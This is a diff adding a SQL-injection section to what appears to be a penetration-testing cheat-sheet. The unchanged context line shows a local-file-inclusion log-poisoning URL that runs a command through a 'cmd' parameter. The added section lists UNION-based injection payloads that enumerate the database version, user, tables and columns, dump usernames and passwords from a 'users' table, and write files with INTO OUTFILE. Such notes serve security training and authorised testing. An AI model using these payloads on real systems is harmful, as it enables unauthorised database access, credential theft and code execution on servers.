@@ -40,3 +40,35 @@ Now you can request the log-file through the LFI and see the php-code get execut
 ```
 http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ```
+
+
+# sqli
+- service: sql
+- service: http
+- tactics: enumeration
+- tactics: inital_access
+- tactics: exfiltration
+
+## external resource
+[sql-injection](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)
+
+## check if you can find a row, where you can place your output  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`
+
+## get the version of the database  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5`
+
+## get the current user  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5`
+
+## see all tables  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables`
+
+## get column names for a specified table  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'`
+
+## concat user names and passwords (0x3a represents “:”)  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users`
+
+## write into a file  
+- `http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'`
